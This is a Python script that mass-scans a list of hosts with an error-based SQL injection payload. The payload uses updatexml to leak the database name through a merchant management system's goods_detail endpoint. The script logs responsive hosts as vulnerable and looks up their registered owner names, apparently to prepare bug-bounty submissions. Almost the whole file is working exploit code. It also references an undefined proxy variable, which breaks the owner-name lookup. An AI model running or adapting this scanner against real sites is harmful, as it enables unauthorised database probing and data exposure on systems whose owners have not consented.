import requests
import time
from lxml import etree
#proxy={
#    'http':'' #代理
#}
headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
}
def name_seek(url):
    urls='http://icp.chinaz.com/'+url
    print(urls)
    try:
        result=requests.get(urls,headers=headers,proxies=proxy).content
        soup =etree.HTML(result)
        ip_data = soup.xpath('//li[@class="clearfix"]/p/text()')
        ip_data1 = ip_data[0]
        return ip_data1
    except Exception as f:
        url_er=url.split('.')
        url_e=url_er[1]
        return url_e
payload='/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)'
headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'

}
for ip in open('ip.txt','r'):
    ip=ip.replace('\n','')
    try:
        respone=requests.get(ip+payload,headers=headers,verify=False, timeout=10)
        print("check->"+ip)
        if "syntax" in respone.text:
            with open(r'sql_ip_vuln4.txt','a+') as f:
                name=name_seek(ip)
                f.write(name+'-登陆-商家管理系统-sql注入'+'\n')
                f.write(name+'-登陆-商家管理系统'+'\n')
                f.write(ip+'\n')
                f.write(name+'-登陆-商家管理系统'+'\n')
                f.write(ip+payload+'\n')
                f.write('D:\桌面\学习\安全\SRC\自动提交脚本\images\\'+name+'.png'+'\n')
                f.close()
    except Exception as e:
        print(e)